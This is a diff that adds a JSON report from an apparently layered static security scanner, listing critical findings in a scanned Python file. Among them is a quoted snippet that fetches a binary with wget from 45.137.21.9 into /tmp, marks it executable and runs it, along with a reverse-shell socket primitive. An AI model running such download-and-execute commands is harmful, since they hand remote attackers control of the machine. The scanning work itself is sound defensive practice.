@@ -1,0 +1,137 @@
+{
+  "file_hash": "4e0405cff935ccba19350a168f50cf9921d15881c9bc15d476674141898fbb18",
+  "file_size": 1650,
+  "file_type": "python",
+  "is_text": true,
+  "entropy": 5.181856629401484,
+  "max_severity": "critical",
+  "severity_score": 1.0,
+  "findings": [
+    {
+      "layer": "L2_REGEX",
+      "severity": "critical",
+      "primitive": "shell.subprocess_shell",
+      "location": "line 52:col 1",
+      "snippet": "subprocess.Popen(\"wget http://45.137.21.9/x -O /tmp/x && chmod +x /tmp/x && /tmp/x\",\n                 shell=True",
+      "explanation": "subprocess call with shell=True \u2014 RCE if any arg is attacker-controlled.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L2_REGEX",
+      "severity": "critical",
+      "primitive": "eval.exec",
+      "location": "line 9:col 14",
+      "snippet": "eval(",
+      "explanation": "eval/exec on dynamic input is arbitrary code execution.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L2_REGEX",
+      "severity": "critical",
+      "primitive": "pickle.loads",
+      "location": "line 16:col 11",
+      "snippet": "pickle.loads(",
+      "explanation": "pickle deserialization on untrusted data is RCE.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L2_REGEX",
+      "severity": "critical",
+      "primitive": "reverse.shell.python",
+      "location": "line 30:col 9",
+      "snippet": "socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
+      "explanation": "Raw TCP socket construction \u2014 reverse shell primitive.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L2_REGEX",
+      "severity": "high",
+      "primitive": "path.traversal",
+      "location": "line 20:col 44",
+      "snippet": "../../../",
+      "explanation": "Path-traversal sequence \u2014 escapes intended directory.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L2_REGEX",
+      "severity": "high",
+      "primitive": "path.traversal",
+      "location": "line 21:col 11",
+      "snippet": "../../../",
+      "explanation": "Path-traversal sequence \u2014 escapes intended directory.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L2_REGEX",
+      "severity": "medium",
+      "primitive": "symlink.race",
+      "location": "line 44:col 5",
+      "snippet": "os.symlink(",
+      "explanation": "Symlink primitive \u2014 possible TOCTOU race or .so hijack.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L2_REGEX",
+      "severity": "low",
+      "primitive": "ipv4.external",
+      "location": "line 31:col 17",
+      "snippet": "45.137.21.9",
+      "explanation": "Hardcoded IPv4 \u2014 verify it's not a C2 endpoint.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L2_REGEX",
+      "severity": "low",
+      "primitive": "ipv4.external",
+      "location": "line 52:col 31",
+      "snippet": "45.137.21.9",
+      "explanation": "Hardcoded IPv4 \u2014 verify it's not a C2 endpoint.",
+      "confidence": 0.85
+    },
+    {
+      "layer": "L1_AST",
+      "severity": "critical",
+      "primitive": "builtin.eval",
+      "location": "line 9:col 13",
+      "snippet": "eval(...)",
+      "explanation": "Direct eval() of untrusted input is RCE.",
+      "confidence": 1.0
+    },
+    {
+      "layer": "L1_AST",
+      "severity": "critical",
+      "primitive": "pickle.loads",
+      "location": "line 16:col 10",
+      "snippet": "pickle.loads(...)",
+      "explanation": "pickle.loads on untrusted data is arbitrary code execution.",
+      "confidence": 1.0
+    },
+    {
+      "layer": "L1_AST",
+      "severity": "critical",
+      "primitive": "os.system",
+      "location": "line 49:col 0",
+      "snippet": "os.system(...)",
+      "explanation": "Shell-out via os.system/popen is shell injection.",
+      "confidence": 1.0
+    },
+    {
+      "layer": "L1_AST",
+      "severity": "critical",
+      "primitive": "subprocess.shell_true",
+      "location": "line 52:col 0",
+      "snippet": "subprocess.<call>(..., shell=True)",
+      "explanation": "shell=True with any user-tainted input is RCE.",
+      "confidence": 1.0
+    }
+  ],
+  "scan_duration_ms": 2.366011000049184,
+  "layers_run": [
+    "L3_BYTES",
+    "L4_ENTROPY",
+    "L2_REGEX",
+    "L1_AST",
+    "L5_STRUCTURE"
+  ],
+  "error": null
+}
